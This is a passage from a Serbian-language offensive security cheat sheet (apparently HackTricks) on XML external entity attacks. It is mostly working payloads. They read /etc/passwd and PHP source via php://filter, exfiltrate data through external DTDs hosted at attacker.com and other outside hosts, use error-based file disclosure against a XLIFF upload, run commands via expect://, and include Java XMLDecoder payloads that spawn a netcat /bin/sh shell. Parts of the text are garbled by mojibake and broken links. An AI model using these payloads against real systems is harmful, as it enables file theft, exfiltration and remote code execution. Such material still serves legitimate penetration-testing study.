Mo쬰te koristiti \[**"Encode Recipe**" od cyberchef-a ovde ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) transformi코ete u UTF-7.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Bypass protokola File:/

Ako web koristi PHP, umesto kori코캖enja `file:/` mo쬰te koristiti **php omota캜e** `php://filter/convert.base64-encode/resource=` da **pristupite internim fajlovima**.

Ako web koristi Java, mo쬰te proveriti [**jar protokol**](xxe-xee-xml-external-entity.md#jar-protocol).

### HTML entiteti

Triks sa [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Mo쬰te kreirati **entitet unutar entiteta** enkodiraju캖i ga sa **HTML entitetima** i zatim ga pozvati da **u캜ita dtd**.\
Imajte na umu da se koriste **numeri캜ki HTML entiteti** (kao 코to je \[u ovom primeru]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD primer: 

DTD (Document Type Definition) je jezik koji se koristi za definisanje strukture XML dokumenata. DTD defini코e elemente, atribute i entitete koji se mogu koristiti u XML dokumentu. DTD se 캜esto koristi za validaciju XML dokumenata i obezbe캠uje jasno definisane pravila za njihovu strukturu.

Evo jednostavnog primera DTD-a:

```xml
<!DOCTYPE root [
  <!ELEMENT root (element1, element2)>
  <!ELEMENT element1 (#PCDATA)>
  <!ELEMENT element2 (#PCDATA)>
]>
<root>
  <element1>Primer</element1>
  <element2>DTD</element2>
</root>
```

U ovom primeru, DTD defini코e da se `root` element sastoji od `element1` i `element2` elemenata. Oba elementa mogu sadr쬬ti samo tekstualne podatke (`#PCDATA`). XML dokument koji se sla쬰 sa ovim DTD-om mora imati ta캜no ovu strukturu.
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP omota캜i

### Base64

**Izvuci** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Izdvajanje spoljnog resursa**

XML External Entity (XXE) napad je tehnika koja omogu캖ava napada캜u da izvu캜e ili ubaci spoljni resurs u XML dokument. Ova tehnika se zasniva na slabosti u obradi eksternih entiteta u XML parserima.

Napada캜 mo쬰 iskoristiti XXE napad da bi dobio pristup osetljivim informacijama, kao 코to su sistemski fajlovi, baze podataka ili druge resurse na serveru. Tako캠e, napada캜 mo쬰 izvr코iti udaljeni napad izvr코avanjem zlonamernog koda.

Da bi izveo XXE napad, napada캜 mora da ubaci zlonamerni XML kod koji sadr쬴 referencu na eksterni entitet. Kada XML parser obradi dokument, on 캖e poku코ati da u캜ita eksterni entitet, 코to omogu캖ava napada캜u da izvu캜e ili ubaci spoljni resurs.

Postoje razli캜iti na캜ini za izvo캠enje XXE napada, uklju캜uju캖i upotrebu ENTITY deklaracija, DTD (Document Type Definition) eksternih entiteta i parametara zahteva.

Da biste se za코titili od XXE napada, preporu캜uje se kori코캖enje sigurnih XML parsera koji isklju캜uju obradu eksternih entiteta ili pravilno konfigurisanje postoje캖ih parsera. Tako캠e je va쬹o validirati i filtrirati korisni캜ki unos kako bi se spre캜ilo ubacivanje zlonamernog XML koda.
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Udaljeno izvr코avanje koda

**Ako je u캜itan PHP modul "expect"**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**

SOAP (Simple Object Access Protocol) je protokol za razmenu struktuiranih poruka izme캠u aplikacija. Me캠utim, SOAP mo쬰 biti podlo쬬n napadima na XML eksterne entitete (XEE).

XML eksterne entitete (XEE) su entiteti koji se referi코u na eksterne resurse putem URI-a. Napada캜 mo쬰 iskoristiti XEE napad da bi dobio pristup osetljivim informacijama ili izvr코io udaljeni kod.

Da bi izvr코io XEE napad, napada캜 mora da ubaci zlonamerni XML sadr쬬j koji sadr쬴 eksterne entitete. Kada aplikacija parsira XML, ona 캖e poku코ati da resoluje ove entitete, 코to mo쬰 dovesti do curenja osetljivih podataka ili izvr코avanja udaljenog koda.

Da biste se za코titili od XEE napada, preporu캜uje se slede캖e:

- Koristite najnoviju verziju SOAP biblioteke koja ima ugra캠ene sigurnosne mehanizme protiv XEE napada.
- Validirajte ulazne XML poruke kako biste spre캜ili ubacivanje zlonamernog sadr쬬ja.
- Isklju캜ite podr코ku za eksterne entitete u XML parseru.
- Koristite bezbedne metode za obradu XML podataka, kao 코to je SAX parser umesto DOM parsera.

Primenom ovih mera, mo쬰te smanjiti rizik od XEE napada i za코tititi svoje SOAP aplikacije od potencijalnih bezbednosnih propusta.
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Ovaj primer je inspirisan [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

XLIFF (XML Localization Interchange File Format) se koristi za standardizaciju razmene podataka u procesima lokalizacije. To je XML bazirani format koji se uglavnom koristi za prenos lokalizabilnih podataka izme캠u alata tokom lokalizacije i kao zajedni캜ki format razmene za CAT (Computer-Aided Translation) alate.

### Analiza slepe zahteva

Zahtev se 코alje serveru sa slede캖im sadr쬬jem:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Me캠utim, ovaj zahtev izaziva internu serversku gre코ku, ta캜nije pominje problem sa deklaracijama obele쬬vanja:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Uprkos gre코ci, zabele쬰n je pogodak na Burp Collaboratoru, 코to ukazuje na odre캠eni nivo interakcije sa spoljnom entitetom.

Izvla캜enje podataka van mre쬰
Za izvla캜enje podataka, 코alje se modifikovani zahtev:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Ovaj pristup otkriva da User Agent ukazuje na kori코캖enje Java 1.8. Prime캖eno ograni캜enje ove verzije Jave je nemogu캖nost dobijanja datoteka koje sadr쬰 znak za novi red, kao 코to je /etc/passwd, koriste캖i tehniku van opsega.

Izvla캜enje podataka na osnovu gre코aka
Da bi se prevazi코lo ovo ograni캜enje, koristi se pristup na osnovu gre코aka. DTD datoteka je strukturirana na slede캖i na캜in kako bi izazvala gre코ku koja uklju캜uje podatke iz ciljne datoteke:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Server odgovara sa gre코kom, bitno je da se odra쬬va nepostoje캖i fajl, 코to ukazuje da server poku코ava pristupiti navedenom fajlu:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Da biste uklju캜ili sadr쬬j datoteke u poruku o gre코ci, DTD datoteka se prilago캠ava:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Ova modifikacija dovodi do uspe코nog izvla캜enja sadr쬬ja datoteke, kako je prikazano u gre코ci koja se 코alje putem HTTP-a. Ovo ukazuje na uspe코an XXE (XML External Entity) napad, koji koristi tehnike Out of Band i Error-Based za izvla캜enje osetljivih informacija.


## RSS - XEE

Validan XML sa RSS formatom za iskori코캖avanje XXE ranjivosti.

### Ping back

Jednostavan HTTP zahtev ka serveru napada캜a
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### 캛itanje fajla

XML eksterni entitet (XXE) napad omogu캖ava napada캜u da pro캜ita sadr쬬j fajla na serveru. Ovaj napad se izvodi ubacivanjem zlonamernog XML koda koji referi코e na eksterni entitet koji sadr쬴 putanju do ciljanog fajla. Kada server parsira XML zahtev, on 캖e poku코ati da u캜ita sadr쬬j fajla i vratiti ga napada캜u.

Da biste izveli XXE napad, prvo morate prona캖i ranjivu ta캜ku na ciljanom serveru koja parsira XML zahteve. Zatim, ubacite zlonamerni XML kod koji referi코e na eksterni entitet koji sadr쬴 putanju do fajla koji 쬰lite da pro캜itate. Kada server poku코a da u캜ita sadr쬬j fajla, on 캖e ga vratiti kao odgovor na va코 zahtev.

Ovaj napad mo쬰 biti veoma opasan, jer omogu캖ava napada캜u da pristupi osetljivim informacijama, kao 코to su lozinke, konfiguracioni fajlovi ili baze podataka. Da biste se za코titili od XXE napada, preporu캜uje se da se koristi sigurno parsiranje XML-a i da se izbegava upotreba eksternih entiteta u XML kodu.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### 캛itanje izvornog koda

Kori코캖enje PHP base64 filtera
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoder je Java klasa koja kreira objekte na osnovu XML poruke. Ako zlonamerni korisnik mo쬰 da natera aplikaciju da koristi proizvoljne podatke u pozivu metode **readObject**, trenutno 캖e dobiti izvr코avanje koda na serveru.

### Kori코캖enje Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

ProcessBuilder je klasa u Javi koja se koristi za izgradnju i pokretanje vanjskih procesa. Ova klasa omogu캖ava programerima da pokrenu vanjske programe iz svoje Java aplikacije.

Da biste koristili ProcessBuilder, prvo morate stvoriti instancu ove klase. Zatim mo쬰te konfigurirati vanjski proces postavljanjem njegovih argumenta, okoline i radnog direktorija. Nakon 코to ste konfigurirali vanjski proces, mo쬰te ga pokrenuti pozivom metode `start()`.

Ova klasa je korisna u mnogim scenarijima, uklju캜uju캖i izvr코avanje vanjskih skripti, pokretanje drugih programa ili manipulaciju s operativnim sustavom.

Primjer kori코tenja ProcessBuilder-a:

```java
ProcessBuilder processBuilder = new ProcessBuilder("ls", "-l");
processBuilder.directory(new File("/home/user"));
Process process = processBuilder.start();
```

U ovom primjeru, stvaramo instancu ProcessBuilder-a s argumentima "ls" i "-l". Zatim postavljamo radni direktorij na "/home/user". Nakon toga, pokre캖emo vanjski proces pozivom metode `start()`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Alati

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Reference

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
* Izvla캜enje informacija putem HTTP-a koriste캖i sopstveni eksterni DTD: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
